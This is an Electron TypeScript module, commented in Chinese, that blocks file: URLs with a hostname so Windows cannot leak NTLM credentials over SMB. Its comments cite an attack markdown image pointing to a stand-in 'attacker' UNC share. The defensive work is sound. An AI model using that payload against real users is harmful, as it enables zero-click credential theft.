// 安全:拒绝带主机名的 file: 请求,防 Windows UNC/SMB 外连泄露 NTLM 凭据(零点击)。
//
// 打包版 renderer 以 loadFile 加载,页面在 file:// 下。攻击:不受信 markdown 写
// `![](//attacker/share/x.png)`(Milkdown commonmark image 节点仍渲染 <img src>),相对页面 URL
// 解析为 file://attacker/share/x.png → Windows 发起 SMB(或 @SSL 走 WebDAV/HTTPS)并自动 NTLM
// 认证;CSS url() / <link> / fetch 等任意子资源同理。index.html CSP 的 'self' 在 file: 页面下
// 放行任意 file: URL(含其它 host,已实测),拦不住。
//
// 策略:defaultSession 上所有 file: 请求,hostname 非空(含 localhost —— Chromium 不会把它规范化
// 为空,应用自身也从不使用)一律 cancel。应用入口与本地资源都是 file:///…(空 host)不受影响;
// 插件模块走 Blob URL,不经 file:。dev(http 入口)下注册亦无害。
//
// 注意:同一 session 每种 webRequest 事件只能有一个 listener,后注册会覆盖前者 —— 新增
// onBeforeRequest 需求须合并进这里(file-request-policy.test.ts 钉住主进程别处不得注册)。
import type { Session } from 'electron';

/**
 * 纯判定:file: URL 的 authority(`file://` 与下一个 `/` 之间)非空 → true(拒);非 file 不处理。
 * 不用 WHATWG `new URL().hostname`:它把 localhost 规范化为空、对畸形 host 抛错,而 Chromium 交给
 * 加载器的 URL 仍保留原 host(Windows 上非空 host 即映射为 \\host\…)。直接看原始 authority 更贴近
 * 实际加载行为,也天然覆盖 `user@host` / `host@SSL` / `[畸形` 等形态。
 */
export function isBlockedFileRequest(url: string): boolean {
  if (!/^file:/i.test(url)) return false;
  const m = /^file:[/\\]{2}([^/\\?#]*)/i.exec(url);
  return m !== null && m[1] !== '';
}

type WebRequestSession = { webRequest: Pick<Session['webRequest'], 'onBeforeRequest'> };

/** app ready 后、首窗创建前对 session(defaultSession)注册。 */
export function installFileRequestGuard(ses: WebRequestSession): void {
  ses.webRequest.onBeforeRequest({ urls: ['file://*/*'] }, (details, callback) => {
    callback({ cancel: isBlockedFileRequest(details.url) });
  });
}
